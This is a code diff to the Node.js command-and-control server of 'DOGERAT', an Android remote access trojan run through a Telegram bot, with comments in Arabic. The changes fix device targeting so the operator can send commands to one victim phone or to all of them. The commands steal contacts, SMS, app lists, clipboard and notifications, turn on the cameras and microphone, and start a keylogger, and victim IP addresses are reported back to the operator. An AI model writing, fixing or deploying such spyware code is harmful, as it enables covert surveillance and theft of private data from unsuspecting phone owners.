@@ -33,6 +33,8 @@ const bot = new telegramBot(data.token, {
 
 // ========== تخزين البيانات ==========
 const connectedDevices = new Map();
+// ========== تخزين الجهاز المختار ==========
+const selectedDevice = new Map(); // <--- تم إضافة هذا لحل مشكلة appData
 
 // ========== إعدادات Express ==========
 app.use(express.json());
@@ -117,6 +119,9 @@ bot.onText(/✯ All ✯/, (msg) => {
     const chatId = msg.chat.id;
     if (chatId.toString() !== data.id) return;
 
+    // تعيين "الكل" كجهاز مختار
+    selectedDevice.set('target', 'all');
+
     bot.sendMessage(data.id, '<b>✯ Select action to perform for all available devices</b>', {
         parse_mode: 'HTML',
         reply_markup: {
@@ -135,23 +140,71 @@ bot.onText(/✯ All ✯/, (msg) => {
     });
 });
 
-// ========== معالجة الأوامر ==========
+// ========== اختيار جهاز معين ==========
+// يتم استدعاؤها عند النقر على معرف الجهاز
+bot.onText(/^[a-zA-Z0-9_-]+$/, (msg) => {
+    const chatId = msg.chat.id;
+    if (chatId.toString() !== data.id) return;
+
+    const deviceId = msg.text;
+    if (connectedDevices.has(deviceId)) {
+        selectedDevice.set('target', deviceId);
+        const device = connectedDevices.get(deviceId);
+        bot.sendMessage(data.id, `<b>✯ Select action to perform for ${device.name}</b>\n\n`, {
+            parse_mode: 'HTML',
+            reply_markup: {
+                keyboard: [
+                    ['✯ Contacts ✯', '✯ SMS ✯'],
+                    ['✯ Apps ✯', '✯ Main camera ✯'],
+                    ['✯ Selfie Camera ✯', '✯ Microphone ✯'],
+                    ['✯ Vibrate ✯', '✯ Toast ✯'],
+                    ['✯ Clipboard ✯', '✯ Notification ✯'],
+                    ['✯ Keylogger ON ✯', '✯ Keylogger OFF ✯'],
+                    ['✯ Cancel action ✯']
+                ],
+                resize_keyboard: true,
+                one_time_keyboard: true
+            }
+        });
+    }
+});
+
+// ========== معالجة الأوامر (المصححة) ==========
 const handleCommand = (command, msg) => {
     const chatId = msg.chat.id;
     if (chatId.toString() !== data.id) return;
 
-    const target = appData?.get('currentTarget');
-    const deviceId = target || [...connectedDevices.keys()][0];
+    // الحصول على الجهاز المختار
+    const target = selectedDevice.get('target');
+    let deviceId;
 
-    if (!deviceId || !connectedDevices.has(deviceId)) {
-        bot.sendMessage(data.id, '❌ No device selected or connected');
+    if (target === 'all') {
+        // إرسال لجميع الأجهزة
+        if (connectedDevices.size === 0) {
+            bot.sendMessage(data.id, '❌ No devices connected');
+            return;
+        }
+        io.emit('command', { request: command });
+        bot.sendMessage(data.id, `📩 ${command} command sent to all devices!`);
         return;
+    } else if (target && connectedDevices.has(target)) {
+        deviceId = target;
+    } else {
+        // إذا لم يتم اختيار جهاز، استخدم أول جهاز متصل
+        const firstDevice = [...connectedDevices.keys()][0];
+        if (!firstDevice) {
+            bot.sendMessage(data.id, '❌ No device connected');
+            return;
+        }
+        deviceId = firstDevice;
     }
 
     io.to(deviceId).emit('command', { request: command });
-    bot.sendMessage(data.id, `📩 ${command} command sent!`);
+    const device = connectedDevices.get(deviceId);
+    bot.sendMessage(data.id, `📩 ${command} command sent to ${device?.name || 'device'}!`);
 };
 
+// ========== تسجيل الأوامر ==========
 bot.onText(/✯ Contacts ✯/, (msg) => handleCommand('contacts', msg));
 bot.onText(/✯ SMS ✯/, (msg) => handleCommand('sms', msg));
 bot.onText(/✯ Apps ✯/, (msg) => handleCommand('apps', msg));
@@ -164,6 +217,41 @@ bot.onText(/✯ Clipboard ✯/, (msg) => handleCommand('clipboard', msg));
 bot.onText(/✯ Notification ✯/, (msg) => handleCommand('notification', msg));
 bot.onText(/✯ Keylogger ON ✯/, (msg) => handleCommand('keylogger-on', msg));
 bot.onText(/✯ Keylogger OFF ✯/, (msg) => handleCommand('keylogger-off', msg));
+
+// ========== إلغاء الأمر ==========
+bot.onText(/✯ Cancel action ✯/, (msg) => {
+    const chatId = msg.chat.id;
+    if (chatId.toString() !== data.id) return;
+
+    selectedDevice.delete('target');
+    bot.sendMessage(data.id, '✅ Action cancelled', {
+        reply_markup: {
+            keyboard: [
+                ['✯ Devices ✯', '✯ About us ✯'],
+                ['✯ Cancel action ✯']
+            ],
+            resize_keyboard: true
+        }
+    });
+});
+
+// ========== معلومات عن الأداة ==========
+bot.onText(/✯ About us ✯/, (msg) => {
+    const chatId = msg.chat.id;
+    if (chatId.toString() !== data.id) return;
+
+    bot.sendMessage(data.id, `
+<b>✯ About DOGERAT</b>
+
+🔴 Real-time control
+📱 Android device management
+🔐 Advanced features
+
+<b>Developed by: @CYBERSHIELDX</b>
+    `, {
+        parse_mode: 'HTML'
+    });
+});
 
 // ========== اتصالات Socket.IO ==========
 io.on('connection', (socket) => {
@@ -192,6 +280,14 @@ io.on('connection', (socket) => {
 🌐 <b>IP:</b> ${deviceIp}
 🕐 <b>Time:</b> ${new Date().toLocaleString()}
     `, { parse_mode: 'HTML' });
+
+    // استقبال الأوامر من الجهاز
+    socket.on('command', (commandData) => {
+        const { request } = commandData;
+        const device = connectedDevices.get(socket.id);
+        console.log(`📩 Command from device: ${request} from ${device?.name}`);
+        bot.sendMessage(data.id, `📩 Device received: ${request} from ${device?.name || 'Unknown'}`);
+    });
 
     socket.on('disconnect', () => {
         const device = connectedDevices.get(socket.id);
